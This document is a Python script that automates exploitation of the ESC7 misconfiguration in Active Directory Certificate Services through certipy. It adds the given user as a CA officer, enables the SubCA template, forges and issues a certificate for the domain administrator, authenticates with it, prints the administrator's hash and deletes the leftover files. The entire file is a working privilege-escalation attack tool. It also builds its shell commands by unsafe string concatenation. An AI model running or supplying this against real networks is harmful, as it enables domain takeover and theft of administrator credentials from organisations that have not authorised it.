#!/usr/bin/python3
from os import geteuid
from sys import argv
import subprocess

if (len(argv) < 5):
    print("Invalid arguments")
    print(argv[0] + " corp-DC-CA corp.local username password")
    quit()

certipy = subprocess.getoutput('which certipy')

ca = argv[1]
print("CA: " + ca)

domain = argv[2]
print("Domain: " + domain)

user = argv[3]
print("User: " + user)

userpass = argv[4]
print("Password: " + userpass)

print("Checking if vulnerable to ESC7...")
command = certipy + ' find -u ' + user + ' -p \'' + userpass + '\' -target ' + domain + ' -stdout -vulnerable -text 2>/dev/null | grep ESC7'
poutput = subprocess.getoutput(command)
if (poutput.find('has dangerous permissions') < 0):
    print("Not vulnerable to ESC7 :(")
    quit()
print("Vulnerable to ESC7 - Exploiting...")
# https://github.com/ly4k/Certipy#esc7

print("Step 1/6...")
command = certipy + ' ca -ca ' + ca + ' -add-officer ' + user + ' -username ' + user + '@' + domain + ' -password \'' + userpass + '\' 2>/dev/null | tail -n 1'
poutput = subprocess.getoutput(command)
if (poutput.find('Successfully added officer') < 0 and poutput.find('already has officer rights') < 0):
    print('Something went wrong at Step 1 - Try run again - Sorry :<')
    quit()

print('Step 2/6...')
command = certipy + ' ca -ca ' + ca + ' -enable-template SubCA -username ' + user + '@' + domain + ' -password \'' + userpass + '\' 2>/dev/null'
poutput = subprocess.getoutput(command)
if (poutput.find('[*] Successfully enabled') < 0):
    print('Something went wrong at Step 2 - Try run again - Sorry :<')
    quit()

print('Step 3/6...')
command = 'echo "y" | ' + certipy + ' req -username ' + user + '@' + domain + ' -password \'' + userpass + '\' -ca ' + ca + ' -target ' + domain + ' -template SubCA -upn administrator@' + domain + ' | grep "Request ID is "'
poutput = subprocess.getoutput(command)
if (poutput.find('Request ID is') < 0):
    print('Something went wrong at Step 3 - Sorry :<')
    quit()
rID = poutput.split('Request ID is ')[1]

print('Step 4/6...')
command = certipy + ' ca -ca ' + ca + ' -issue-request ' + rID + ' -username ' + user + '@' + domain + ' -password \'' + userpass + '\''
poutput = subprocess.getoutput(command)
if (poutput.find('Successfully issued certificate') < 0):
    print('Something went wrong at Step 4 - Sorry :<')
    quit()

print('Step 5/6...')
command = certipy + ' req -username ' + user + '@' + domain + ' -password \'' + userpass + '\' -ca ' + ca + ' -target ' + domain + ' -retrieve ' + rID
poutput = subprocess.getoutput(command)
subprocess.getoutput('rm ' + rID + '.key')
if (poutput.find('[*] Saved certificate and private key to') < 0):
    print('Something went wrong at Step 5 - Sorry :<')
    quit()

print('Step 6/6...')
command = certipy + ' auth -pfx administrator.pfx 2>/dev/null | tail -n 1'
poutput = subprocess.getoutput(command)
if (poutput.find('Clock skew too great') > 0):
    print('Error at Step 6 - Sync your clock with the DC')
    print('sudo timedatectl set-ntp 0')
    print('sudo rdate -n ' + domain)
    print(command)
    quit()

if (poutput.find('Got hash for') < 0):
    print('Something went wrong at Step 6 - Sorry :<')
    quit()
hash = poutput.split(': ')[1]
print("Attack successful! administrator hash is: " + hash)
subprocess.getoutput('rm administrator.pfx administrator.ccache')
